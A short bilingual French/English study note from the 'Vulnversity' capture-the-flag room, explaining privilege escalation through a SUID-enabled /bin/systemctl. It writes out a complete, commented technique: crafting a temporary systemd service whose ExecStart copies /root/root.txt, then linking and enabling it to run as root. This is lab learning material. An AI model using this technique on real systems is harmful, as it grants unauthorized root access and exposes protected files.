# Systemctl
*```systemd``` et ```systemctl``` remplacent ```SysVInit``` (= service, chkconfig, etc) cf. [explications](https://www.tala-informatique.fr/wiki/index.php/Systemctl)*<br/>
```systemctl``` permet notamment de gérer les services et leurs dépendances, *et c'est ce qui va nous intéresser*
<br/><br/>
__Contexte:__<br/>
*Dans la room Vulnversity, section Privilege Escalation, on avait réussi à accéder au système hébergeant le site web via un exploit.<br>
We listed all SUID files and noticed that* ```/bin/systemctl``` *was one of them.<br/>
The last task was to retrieve an information contained in /root/root.txt. Didn't have any ideas how to make it, here's the  "solution":<br/><br/>*
```
new_service=$(mktemp).service                                       # mktemp create a unique temporary filename
echo '[Service]
> ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/flag.txt"         # -c will execute everything inside the quotes
> [Install]
> WantedBy=multi-user.target' > $new_service                        # set the runlevel execution of the service
```
[Service creation syntax](https://medium.com/@benmorel/creating-a-linux-service-with-systemd-611b5c8b91d6)
```
/bin/systemctl link $new_service                                    # will allow to "manage" our new service directly with systemctl
/bin/systemctl enable --now $new_service

cat /tmp/flag.txt
```
